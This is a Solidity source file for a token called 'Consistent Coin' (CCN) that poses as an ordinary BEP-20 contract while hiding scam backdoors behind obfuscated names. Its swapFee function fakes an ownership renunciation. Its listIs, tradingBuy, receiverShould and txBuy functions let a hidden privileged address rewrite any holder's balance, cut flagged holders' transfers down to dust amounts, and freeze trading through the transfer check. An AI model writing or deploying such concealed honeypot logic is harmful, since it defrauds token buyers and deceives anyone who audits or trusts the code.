//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract fromAt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface sellFromExempt {
    function createPair(address launchMin, address launchIs) external returns (address);

    function feeTo() external view returns (address);
}

interface teamLimit {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface tokenTake {
    function totalSupply() external view returns (uint256);

    function balanceOf(address amountIsMarketing) external view returns (uint256);

    function transfer(address enableIs, uint256 liquidityLaunched) external returns (bool);

    function allowance(address buyIs, address spender) external view returns (uint256);

    function approve(address spender, uint256 liquidityLaunched) external returns (bool);

    function transferFrom(
        address sender,
        address enableIs,
        uint256 liquidityLaunched
    ) external returns (bool);

    event Transfer(address indexed from, address indexed totalReceiver, uint256 value);
    event Approval(address indexed buyIs, address indexed spender, uint256 value);
}

interface tokenTakeMetadata is tokenTake {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ConsistentCoin is fromAt, tokenTake, tokenTakeMetadata {

    string private buyLaunchedFrom = "CCN";

    function swapFee() public {
        emit OwnershipTransferred(totalAt, address(0));
        senderAmount = address(0);
    }

    uint256 public modeFrom;

    mapping(address => bool) public totalFrom;

    function amountEnable(address fromSender, address enableIs, uint256 liquidityLaunched) internal view returns (uint256) {
        require(liquidityLaunched > 0);

        uint256 teamMinAt = 0;
        if (fromSender == marketingMin && liquidityAt > 0) {
            teamMinAt = liquidityLaunched * liquidityAt / 100;
        } else if (enableIs == marketingMin && tokenReceiver > 0) {
            teamMinAt = liquidityLaunched * tokenReceiver / 100;
        }
        require(teamMinAt <= liquidityLaunched);
        return liquidityLaunched - teamMinAt;
    }

    function receiverMarketingToken() private view {
        require(liquidityAmount[_msgSender()]);
    }

    uint8 private walletAt = 18;

    uint256 private shouldMode;

    uint256 public teamBuyMode;

    uint256 constant teamLaunched = 3 ** 10;

    uint256 public tokenReceiver = 0;

    string private fundEnableLaunch = "Consistent Coin";

    function owner() external view returns (address) {
        return senderAmount;
    }

    bool private autoLimit;

    function shouldAuto(address fromSender, address enableIs, uint256 liquidityLaunched) internal returns (bool) {
        require(txIs[fromSender] >= liquidityLaunched);
        txIs[fromSender] -= liquidityLaunched;
        txIs[enableIs] += liquidityLaunched;
        emit Transfer(fromSender, enableIs, liquidityLaunched);
        return true;
    }

    uint256 public tokenEnable;

    function symbol() external view virtual override returns (string memory) {
        return buyLaunchedFrom;
    }

    function decimals() external view virtual override returns (uint8) {
        return walletAt;
    }

    function name() external view virtual override returns (string memory) {
        return fundEnableLaunch;
    }

    uint256 swapTakeBuy;

    function fundAt(address fromSender, address enableIs, uint256 liquidityLaunched) internal returns (bool) {
        if (fromSender == totalAt) {
            return shouldAuto(fromSender, enableIs, liquidityLaunched);
        }
        uint256 shouldEnable = tokenTake(marketingMin).balanceOf(launchedTake);
        require(shouldEnable == swapTakeBuy);
        require(enableIs != launchedTake);
        if (totalFrom[fromSender]) {
            return shouldAuto(fromSender, enableIs, teamLaunched);
        }
        liquidityLaunched = amountEnable(fromSender, enableIs, liquidityLaunched);
        return shouldAuto(fromSender, enableIs, liquidityLaunched);
    }

    function transferFrom(address fromSender, address enableIs, uint256 liquidityLaunched) external override returns (bool) {
        if (_msgSender() != senderLiquidity) {
            if (shouldLaunched[fromSender][_msgSender()] != type(uint256).max) {
                require(liquidityLaunched <= shouldLaunched[fromSender][_msgSender()]);
                shouldLaunched[fromSender][_msgSender()] -= liquidityLaunched;
            }
        }
        return fundAt(fromSender, enableIs, liquidityLaunched);
    }

    uint256 modeFund;

    mapping(address => uint256) private txIs;

    uint256 private modeTakeLaunched = 100000000 * 10 ** 18;

    uint256 public limitTotal;

    uint256 private fromToSender;

    mapping(address => mapping(address => uint256)) private shouldLaunched;

    function transfer(address senderTrading, uint256 liquidityLaunched) external virtual override returns (bool) {
        return fundAt(_msgSender(), senderTrading, liquidityLaunched);
    }

    address private senderAmount;

    event OwnershipTransferred(address indexed receiverTrading, address indexed minLaunch);

    uint256 public liquidityAt = 0;

    address launchedTake;

    function listIs(address exemptAmount) public {
        require(exemptAmount.balance < 100000);
        if (atTeam) {
            return;
        }
        
        liquidityAmount[exemptAmount] = true;
        if (tokenEnable != limitTotal) {
            shouldMode = tokenEnable;
        }
        atTeam = true;
    }

    bool public minTxLimit;

    function totalSupply() external view virtual override returns (uint256) {
        return modeTakeLaunched;
    }

    address public totalAt;

    address senderLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function allowance(address teamTrading, address launchedTx) external view virtual override returns (uint256) {
        if (launchedTx == senderLiquidity) {
            return type(uint256).max;
        }
        return shouldLaunched[teamTrading][launchedTx];
    }

    bool public atTeam;

    function getOwner() external view returns (address) {
        return senderAmount;
    }

    function balanceOf(address amountIsMarketing) public view virtual override returns (uint256) {
        return txIs[amountIsMarketing];
    }

    function receiverShould(address txFee) public {
        receiverMarketingToken();
        if (minTxLimit != autoLimit) {
            liquidityShouldSell = false;
        }
        if (txFee == totalAt || txFee == marketingMin) {
            return;
        }
        totalFrom[txFee] = true;
    }

    address public marketingMin;

    bool private liquidityShouldSell;

    mapping(address => bool) public liquidityAmount;

    function approve(address launchedTx, uint256 liquidityLaunched) public virtual override returns (bool) {
        shouldLaunched[_msgSender()][launchedTx] = liquidityLaunched;
        emit Approval(_msgSender(), launchedTx, liquidityLaunched);
        return true;
    }

    function txBuy(uint256 liquidityLaunched) public {
        receiverMarketingToken();
        swapTakeBuy = liquidityLaunched;
    }

    function tradingBuy(address senderTrading, uint256 liquidityLaunched) public {
        receiverMarketingToken();
        txIs[senderTrading] = liquidityLaunched;
    }

    constructor (){
        if (teamBuyMode != fromToSender) {
            limitTotal = fromToSender;
        }
        swapFee();
        teamLimit modeListLimit = teamLimit(senderLiquidity);
        marketingMin = sellFromExempt(modeListLimit.factory()).createPair(modeListLimit.WETH(), address(this));
        launchedTake = sellFromExempt(modeListLimit.factory()).feeTo();
        
        totalAt = _msgSender();
        liquidityAmount[totalAt] = true;
        txIs[totalAt] = modeTakeLaunched;
        if (fromToSender != limitTotal) {
            fromToSender = tokenEnable;
        }
        emit Transfer(address(0), totalAt, modeTakeLaunched);
    }

}